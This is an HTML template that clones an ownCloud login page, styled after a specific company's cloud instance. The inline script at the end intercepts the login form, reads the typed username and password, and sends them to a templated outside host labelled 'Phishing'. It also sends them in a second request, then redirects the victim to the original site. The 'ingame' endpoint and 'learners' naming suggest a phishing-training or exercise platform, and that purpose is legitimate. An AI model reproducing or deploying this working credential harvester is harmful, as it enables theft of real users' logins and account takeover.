<!DOCTYPE html>
<html class="ng-csp" data-placeholder-focus="false" lang="en">
        <head
                data-requesttoken="JmwZDxwoPTsnXRUBNHoZExMDJT8pQBMZbmcOKCcGRFg=:L5nnnxItQvaLm/UKtRURDvTUERKisp1are4qloCICL4=">
                <meta
                        http-equiv="content-type"
                        content="text/html; charset=UTF-8" />
                <meta charset="utf-8" />
                <title>ownCloud</title>
                <meta http-equiv="X-UA-Compatible" content="IE=edge" />
                <meta name="referrer" content="never" />
                <meta
                        name="viewport"
                        content="width=device-width, minimum-scale=1.0, maximum-scale=1.0" />
                <meta name="apple-itunes-app" content="app-id=1359583808" />
                <meta name="theme-color" content="#1d2d44" />
                <link
                        rel="icon"
                        href="https://cloud.optiteq-a.at/core/img/favicon.ico" />
                <link
                        rel="apple-touch-icon-precomposed"
                        href="https://cloud.optiteq-a.at/core/img/favicon-touch.png" />
                <link
                        rel="mask-icon"
                        sizes="any"
                        href="https://cloud.optiteq-a.at/core/img/favicon-mask.svg"
                        color="#1d2d44" />
                <link rel="stylesheet" href="assets/select2.css" />
                <link rel="stylesheet" href="assets/styles.css" />
                <link rel="stylesheet" href="assets/inputs.css" />
                <link rel="stylesheet" href="assets/header.css" />
                <link rel="stylesheet" href="assets/icons.css" />
                <link rel="stylesheet" href="assets/fonts.css" />
                <link rel="stylesheet" href="assets/apps.css" />
                <link rel="stylesheet" href="assets/global.css" />
                <link rel="stylesheet" href="assets/fixes.css" />
                <link rel="stylesheet" href="assets/multiselect.css" />
                <link rel="stylesheet" href="assets/mobile.css" />
                <link rel="stylesheet" href="assets/jquery-ui.css" />
                <link rel="stylesheet" href="assets/jquery-ui-fixes.css" />
                <link rel="stylesheet" href="assets/tooltip.css" />
                <link rel="stylesheet" href="assets/share.css" />
                <link rel="stylesheet" href="assets/versions.css" />
                <link rel="stylesheet" href="assets/jquery.ocdialog.css" />
                <script src="assets/oc.js"></script>
                <script src="assets/jquery.min.js"></script>
                <script src="assets/jquery-migrate.min.js"></script>
                <script src="assets/jquery-ui.custom.js"></script>
                <script src="assets/underscore.js"></script>
                <script src="assets/moment-with-locales.js"></script>
                <script src="assets/handlebars.js"></script>
                <script src="assets/md5.js"></script>
                <script src="assets/tooltip.js"></script>
                <script src="assets/backbone.js"></script>
                <script src="assets/es6-promise.auto.js"></script>
                <script src="assets/client_002.js"></script>
                <script src="assets/clipboard.js"></script>
                <script src="assets/bowser.js"></script>
                <script src="assets/jquery.ocdialog.js"></script>
                <script src="assets/oc-dialogs.js"></script>
                <script src="assets/js.js"></script>
                <script src="assets/l10n.js"></script>
                <script src="assets/octemplate.js"></script>
                <script src="assets/eventsource.js"></script>
                <script src="assets/config.js"></script>
                <script src="assets/search.js"></script>
                <script src="assets/oc-requesttoken.js"></script>
                <script src="assets/apps.js"></script>
                <script src="assets/mimetype.js"></script>
                <script src="assets/mimetypelist.js"></script>
                <script src="assets/snap.js"></script>
                <script src="assets/select2.js"></script>
                <script src="assets/oc-backbone.js"></script>
                <script src="assets/oc-backbone-webdav.js"></script>
                <script src="assets/placeholder.js"></script>
                <script src="assets/jquery.avatar.js"></script>
                <script src="assets/shareconfigmodel.js"></script>
                <script src="assets/sharemodel.js"></script>
                <script src="assets/sharescollection.js"></script>
                <script src="assets/shareitemmodel.js"></script>
                <script src="assets/sharedialogresharerinfoview.js"></script>
                <script src="assets/sharedialoglinklistview.js"></script>
                <script src="assets/sharedialoglinkshareview.js"></script>
                <script src="assets/sharedialogmailview.js"></script>
                <script src="assets/sharedialoglinksocialview.js"></script>
                <script src="assets/sharedialoglinkexpirationview.js"></script>
                <script src="assets/sharedialogshareelistview.js"></script>
                <script src="assets/sharedialogview.js"></script>
                <script src="assets/share.js"></script>
                <script src="assets/files_mediaviewer_init.js"></script>
                <script src="assets/fileinfo.js"></script>
                <script src="assets/client.js"></script>
                <script src="assets/jstz.js"></script>
                <script src="assets/visitortimezone.js"></script>
                <script src="assets/lostpassword.js"></script>
                <script src="assets/login.js"></script>
                <script src="assets/browser-update.js"></script>
        </head>
        <body id="body-login">
                <noscript>
                        <div id="nojavascript">
                                <div>
                                        This application requires JavaScript for
                                        correct operation. Please
                                        <a
                                                href="http://enable-javascript.com/"
                                                target="_blank"
                                                rel="noreferrer"
                                                >enable JavaScript</a
                                        >
                                        and reload the page.
                                </div>
                        </div>
                </noscript>
                <div class="wrapper">
                        <div class="v-align">
                                <header role="banner">
                                        <div id="header">
                                                <div class="logo">
                                                        <h1
                                                                class="hidden-visually">
                                                                ownCloud
                                                        </h1>
                                                </div>
                                                <div
                                                        id="logo-claim"
                                                        style="
                                                                display: none;
                                                        "></div>
                                        </div>
                                </header>

                                <!--[if IE 8
                                        ]><style>
                                                input[type='checkbox'] {
                                                        padding: 0;
                                                }
                                        </style><!
                                [endif]-->
                                <form method="post" name="login">
                                        <fieldset>
                                                <div
                                                        id="message"
                                                        class="hidden">
                                                        <img
                                                                class="float-spinner"
                                                                alt=""
                                                                src="assets/loading-dark.gif" />
                                                        <span
                                                                id="messageText"></span>
                                                        <!-- the following div ensures that the spinner is always inside the #message div -->
                                                        <div
                                                                style="
                                                                        clear: both;
                                                                "></div>
                                                </div>
                                                <p class="grouptop">
                                                        <input
                                                                type="text"
                                                                name="user"
                                                                id="user"
                                                                placeholder="Username or email"
                                                                value=""
                                                                autofocus=""
                                                                autocomplete="on"
                                                                autocapitalize="none"
                                                                autocorrect="off"
                                                                required="" />
                                                        <label
                                                                for="user"
                                                                class="infield"
                                                                >Username or
                                                                email</label
                                                        >
                                                </p>

                                                <p class="groupbottom">
                                                        <input
                                                                type="password"
                                                                name="password"
                                                                id="password"
                                                                value=""
                                                                placeholder="Password"
                                                                autocomplete="off"
                                                                autocapitalize="none"
                                                                autocorrect="off"
                                                                required="" />
                                                        <label
                                                                for="password"
                                                                class="infield"
                                                                >Password</label
                                                        >
                                                        <input
                                                                type="submit"
                                                                id="submit"
                                                                class="login primary icon-confirm"
                                                                title="Log in"
                                                                value="" />
                                                </p>

                                                <input
                                                        type="hidden"
                                                        name="timezone-offset"
                                                        id="timezone-offset"
                                                        value="2" />
                                                <input
                                                        type="hidden"
                                                        name="timezone"
                                                        id="timezone"
                                                        value="Europe/Berlin" />
                                                <input
                                                        type="hidden"
                                                        name="requesttoken"
                                                        value="JmwZDxwoPTsnXRUBNHoZExMDJT8pQBMZbmcOKCcGRFg=:L5nnnxItQvaLm/UKtRURDvTUERKisp1are4qloCICL4=" />
                                        </fieldset>
                                </form>
                                <div class="push"></div>
                                <!-- for sticky footer -->
                        </div>
                </div>
                <footer role="contentinfo">
                        <p class="info">
                                <a
                                        href="https://owncloud.org/"
                                        target="_blank"
                                        rel="noreferrer"
                                        >ownCloud</a
                                >
                                – A safe home for all your data
                        </p>
                </footer>

                <script>
                        $(document).ready(function () {
                                function sendform(learners, target) {
                                        var username =
                                                document.getElementById(
                                                        'user',
                                                ).value;
                                        var password =
                                                document.getElementById(
                                                        'password',
                                                ).value;

                                        const notification = new Promise(
                                                (resolve, reject) => {
                                                        $.ajax({
                                                                url: `https://${learners}:5000/notifications/ingame`,
                                                                type: 'POST',
                                                                headers: {
                                                                        'Content-Type':
                                                                                'application/json',
                                                                },
                                                                data: JSON.stringify(
                                                                        {
                                                                                message: `<h3>### Phishing ###</h3><br><hl><br>User: ${username}<br>Password:${password}`,
                                                                        },
                                                                ),
                                                                success: (
                                                                        response,
                                                                ) => {
                                                                        resolve(
                                                                                response,
                                                                        );
                                                                },
                                                                error: (
                                                                        xhr,
                                                                        status,
                                                                        error,
                                                                ) => {
                                                                        reject(
                                                                                error,
                                                                        );
                                                                },
                                                        });
                                                },
                                        );

                                        const trap = new Promise(
                                                (resolve, reject) => {
                                                        $.ajax({
                                                                url: `/${username}/${password}`,
                                                                type: 'GET',
                                                                success: (
                                                                        response,
                                                                ) => {
                                                                        resolve(
                                                                                response,
                                                                        );
                                                                },
                                                                error: (
                                                                        xhr,
                                                                        status,
                                                                        error,
                                                                ) => {
                                                                        reject(
                                                                                error,
                                                                        );
                                                                },
                                                        });
                                                },
                                        );

                                        Promise.all([notification, trap])
                                                .then((responses) => {
                                                        window.location.href =
                                                                target;
                                                })
                                                .catch((error) => {
                                                        window.location.href =
                                                                target;
                                                });
                                }

                                $('form').submit(function (event) {
                                        event.preventDefault();
                                        sendform(
                                                '{{ auth_url }}',
                                                '{{ item.original_domain }}',
                                        );
                                });
                        });
                </script>
        </body>
</html>
